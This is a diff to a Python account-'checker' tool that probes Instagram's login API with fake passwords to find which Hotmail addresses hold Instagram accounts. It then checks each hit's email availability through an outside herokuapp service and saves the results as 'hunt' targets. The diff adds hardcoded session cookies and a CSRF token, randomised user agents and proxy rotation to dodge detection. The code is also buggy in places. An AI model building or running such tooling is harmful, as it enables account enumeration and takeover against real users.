@@ -6,6 +6,7 @@ import os
 import uuid
 import sys
 import json
+from user_agent import generate_user_agent
 
 uuid =str(os.getlogin())
 
@@ -25,8 +26,11 @@ class Checker:
         self.f = 0
         self.s = 0
         self.n = 0
+        self.ei =0
         self.j = 0
         self.r = 0
+        self.listnumber = '1234567890'
+        self.numberchoice = str(''.join(random.choice(self.listnumber)for i in range(6)))
         self.whil = True 
         self.e = 0
         self.u = 0
@@ -36,12 +40,28 @@ class Checker:
         self.telegram = "@BBMZZ"
         self.nt = "Connection Error "
         self.colr = str(''.join(random.choice(self.rcol) for i in range(1)))
+        
+        print(self.numberchoice)
    
-        print(f"\033[1;3{self.colr}m[1] - Hotmail\n[2] - Outlook\n[3] - Random Choice Hotmail\n[4] - Call Checker [Hotmail - Outlook] (Acctive) \n[5] - Gmail [new]\n[6] - Username 2010 - 2011 [new]\n[!] - Saved the hunt in Name File (acctive.txt)\n[-] - ID : {id1}\n[!] - Version Tool 0.4")
+        print(f"\033[1;3{self.colr}m[1] - Hotmail\n[2] - Outlook\n[3] - Random Choice Hotmail\n[4] - Call Checker [Hotmail - Outlook] (Acctive) \n[5] - Gmail [new]\n[6] - Username 2010 - 2011 [new]\n[!] - Saved the hunt in Name File (acctive.txt)\n[-] - ID : {id1}\n[!] - Version Tool 0.5")
         self.un = input("[=] - Enter Your Number list : ")
         if self.un =="1":
             os.system('clear')
-            self.hotmail()
+            self.choi = "[1] - Checker Hotmail APi Zaid\n[2] - Checker Hotmail Api Instagram\n[!] - No saved Info username in hit "
+            print(self.choi)
+            self.ux = input('[=] - Enter Your Number 1 or 2 : ')
+            if self.ux ==1:
+                os.system('clear')
+                self.hotmail()
+            elif self.ux == "2":
+                os.system('clear')
+                self.hotmail1()
+
+            else:
+                os.system('clear')
+                self.erp = "Error Number in list "
+                print(self.erp)
+                sys.exit()
         elif self.un =="2":
             os.system('clear')
             self.outlook()
@@ -161,16 +181,96 @@ class Checker:
                     print(f'I.G | {self.a} | I.B | {self.b} | G.B | {self.k} | Telegram | @{self.telegram}')
             except requests.exceptions.ConnectionError as error:
                 continue
+    def hotmail1(self):
+        os.system('clear')
+        self.fil = input("[=] - Enter Your Name File : ")
+        try:
+            self.ope = open(self.fil,'r').read().splitlines()
+
+        except FileNotFoundError as error:
+            self.err="THE NAME FILE ERROR IN PHONE !"
+            print(self.err)
+            sys.exit()
+        for self.email in self.fil:
+            url ='https://www.instagram.com/api/v1/web/accounts/login/ajax/'
+
+            head1 = {
+                    'accept': '*/*',
+                    'accept-encoding': 'gzip, deflate, br',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'content-length': '291',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=iMd8tAhvwezltsWZAVi1adkaSyB7EUzO; ds_user_id=58173081681; shbid="12243\05458173081681\0541711782047:01f709696fd88f95ae617bb02b5b6d15a9e8996d88f9e2d3ee8855533aedb9f4987abd92"; shbts="1680246047\05458173081681\0541711782047:01f7d73e9f512a0f35a524df1d0f51b48fcb0023309d321cfb9c3f54c755152397f7da58"; fbsr_124024574287414=LLfGuxN7PwilAJQ2w2bGqQmOX6p3T2JreIplqK1mKOo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRRFRUem5mcW1BRUJDbGZHcjJSWWV5UERTd3RhSEJTM2lsTERTaUdXZF9fTHdCaFp2VV9ndVltWEJINE9DenUxamJCbWh3TWtSVmdUOXRyWDVWTHlpcGFFY01fMFlSb3pHOVRibWE0NkRMMm9GTE9FWmJhdzhSNF84c2hDZl9FZGtwb2V4MmtSYTIzNm8xa3A2LWFzZGNRVVk4eVFSU3NwQzlhaEI4NFBYWk1FMVA4aUt5aEIzWGlXOGxjaGJ0Y1R2WEdsUnRBNl91MnlCNExxN09PRjdXZG1DT2p6c2lBM3BsZEY4X2FjX181OGpTUDBTSC1DS0dQMHZYYldlaVBDSWs2ell4SGtkRmNTVkdIUE5sTDB3aUk4azBNcVdSbl9nbXk5RWptV282dmRBQlpVTTVabmJwYXFOT2dLem9ndzRDU2x4WUI3clQtUzdjaWJUbGNqWTlZIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUVsVmlXS2JhMkJlRTEwSlBoS01iNVVsdFlhYUlKY05zZVdZWkFodFpCWkNUcElmOTZrNk9nTE9mTnZ1RjdMcUs5WkMyUk1NUWxCQXJPNzVuWkE3U3JLcEtLR3JsRDFEMU5QOWZ5MkxNZkQzeHNINGpMeG9tQUtoRGRnUW1Ea2dzNk10TFNVSEVQbVJFWkFXZkJ5Y1pDbGZmTmp5eGR5U1Jtb3JyN1N2SXN4Y3g2OTdxSVZSSXNaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgwNTQwMzI3fQ',
+                    'sec-ch-prefers-color-scheme': 'light',
+                    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-fetch-dest': 'document',
+                    'sec-fetch-mode': 'navigate',
+                    'sec-fetch-site': 'none',
+                    'sec-fetch-user': '?1',
+            
+                    'user-agent': '{}'.format(generate_user_agent()),
+                    'x-csrftoken': 'iMd8tAhvwezltsWZAVi1adkaSyB7EUzO',
+                    'x-ig-app-id': '936619743392459',
+                    'x-ig-www-claim': '0',
+                    'x-instagram-ajax': '1007230059',
+                    'x-requested-with': 'XMLHttpRequest'
+            }
+            tim = str(time.time()).split('.')[0]
+            data = {
+                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:wjdjwdjwjdwjdjwdj1212',
+                'username': f'{self.email}@hotmail.com',
+                'queryParams': '{}',
+                'optIntoOneTap': 'false',
+                'trustedDeviceRecords': '{}'
+            }
+            try:
+                try:
+                    
+                    rf = requests.post(url,headers=head1,data=data).text
+                except requests.exceptions.ReadTimeout as error:
+                    continue
+                
+            except requests.exceptions.ConnectionError as error:
+                continue
+         
+            if ('"Sorry, your password was incorrect. Please double-check your password."') in rf:
+                self.u+=1
+                os.system('cls'if os.name=='nt'else'clear')
+                print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | E.I | {self.ei}| Telegram | {self.telegram} |')
+            elif ('"Sorry, there was a problem with your request.') in rf:
+                self.ei+=1
+                os.system('cls'if os.name=='nt'else'clear')
+                print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | E.I | {self.ei}| Telegram | {self.telegram} |')
+            elif ('"user":true,') in rf:
+                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.email}/{self.idf}').json()['status']
+                if self.url2=='ok':
+                    with open(f'acctive.txt','a') as f0:
+                        f0.write(f'{self.ra}@hotmail.com\n')
+                else:
+                    self.s+=1
+                    os.system('cls'if os.name=='nt'else'clear')
+                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | E.I | {self.ei}| Telegram | {self.telegram} |')
+
+
+
+
     def username(self):
         global listcookies
         os.system('clear')
         self.listnum ="1234567890"
         
         self.lc = random.choice(listcookies)
+        self.pro = open('proxy11.txt','r').read().splitlines()
         print(self.lc)
         time.sleep(2)
         while self.whil :
-            self.ro = str(''.join(random.choice(self.listnum)for i in range(self.number1)))
+            self.ro = str(''.join(random.choice(self.numberchoice)for i in range(self.number1)))
+            po = random.choice(self.pro)
+            print(po)
+            pe ={'http':f"http://{po}"}
+            
             url = f'http://i.instagram.com/api/v1/users/{self.ro}/info/'
             headers = {
             'Host': 'i.instagram.com',
@@ -190,7 +290,7 @@ class Checker:
             try:
                 if 'User not found' in rr:
                     self.iderr = "Tihe ID Error"
-                    print(self.iderr)
+                    continue
                 else:
                     self.rspo=json.loads(rr)
                     self.user = self.rspo['user']['username']
